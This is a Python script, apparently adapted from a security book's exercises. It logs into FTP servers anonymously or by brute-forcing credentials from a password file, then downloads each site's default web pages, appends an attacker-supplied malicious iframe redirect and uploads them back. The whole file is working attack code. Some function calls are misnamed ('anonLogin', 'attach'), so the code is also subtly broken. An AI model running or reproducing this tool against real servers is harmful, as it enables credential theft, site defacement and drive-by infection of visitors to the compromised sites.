'''
    Note:
        - There is an argument parsing error in the book that comes up
        several times where the author tries to parse a list of arguments
        delimited by ', ' however in optparse the assumed functionality
        doesn't exist and required various workarounds. Conveniently, 
        argparse does have such a functionality which is why the string 
        split has been removed. However, take note that the argument list
        in the command should only be delimited by a space and no commas.
'''
import ftplib
import argparse
import time


def anon_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print(
            '\n[*] ' + str(hostname) +\
            ' FTP Anonymous Logon Succeeded.')
        ftp.quit()
        return True
    except Exception as e:
        print(
            '\n[-] ' + str(hostname) +\
            ' FTP Anonymous Logon Failed.')
        return False


def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')

        print('[+] Trying: ' + userName + '/' + passWord)

        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print(
                '\n[*] ' + str(hostname) +\
                ' FTP Logon Succeeded: ' +\
                userName + '/' + passWord)
            ftp.quit()
            return (userName, passWord)
        except Exception as e:
            pass

    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)



def returnDefault(ftp):
    try:
        dirList = ftp.nlst()
    except:
        dirList = []
        print('[-] Could not list directory contents.')
        print('[-] Skipping To Next Target.')
        return
    retList = []

    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print('[+] Found default page: ' + fileName)
            retList.append(fileName)
    return retList


def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print('[+] Downloaded Page: ' + page)
    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: ' + page)
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print('[+] Uploaded Injected Page: ' + page)


def attack(username, password, tgtHost, redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defPages = returnDefault(ftp)
    for defPage in defPages:
        injectPage(ftp, defPage, redirect)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-H', dest='tgtHosts', type=str, 
        required=True, nargs='+',
        help='specify target host')
    parser.add_argument(
        '-f', dest='passwdFile', type=str,
        help='specify user/password file')
    parser.add_argument(
        '-r', dest='redirect', type=str,
        required=True, help='specify a redirection page')
    options = parser.parse_args()

    tgtHosts = options.tgtHosts
    passwdFile = options.passwdFile
    redirect = options.redirect

    for tgtHost in tgtHosts:
        username = None
        password = None
        if anonLogin(tgtHost) == True:
            username = 'anonymous'
            password = 'me@your.com'
            print('[+] Using Anonymous Creds to attack')
            attach(username, password, tgtHost, redirect)
        elif passwdFile is not None:
            (username, password) = bruteLogin(tgtHost, passwdFile)
        if password is not None:
            print(
                '[+] Using Creds: ' + username +\
                '/' + password + ' to attack')
            attack(username, password, tgtHost, redirect)


if __name__ == '__main__':
    main()
